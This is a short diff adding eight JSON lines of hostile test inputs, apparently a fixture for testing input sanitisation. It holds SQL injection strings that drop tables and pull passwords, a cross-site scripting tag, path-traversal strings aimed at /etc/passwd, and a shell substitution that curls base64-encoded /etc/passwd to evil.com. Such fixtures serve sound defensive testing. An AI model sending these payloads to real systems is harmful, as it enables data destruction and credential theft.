@@ -1,0 +1,8 @@
+{"query":"SELECT * FROM users WHERE email='admin@example.com'; DROP TABLE users;--"}
+{"field":"<script>alert('xss@evil.com')</script>"}
+{"field":"'; DROP TABLE users; SELECT * FROM credit_cards WHERE number='4532015112830366';--"}
+{"log":"UNION SELECT email,password FROM users WHERE 'x@y.com'='x@y.com'"}
+{"cmd":"$(curl http://evil.com/exfil?data=$(cat /etc/passwd | base64))"}
+{"user":"../../../etc/passwd"}
+{"path":"..%2F..%2F..%2Fetc%2Fpasswd%00.html"}
+{"x":"\\x00\\x01\\x02\\x1b\\xff\\xfe"}
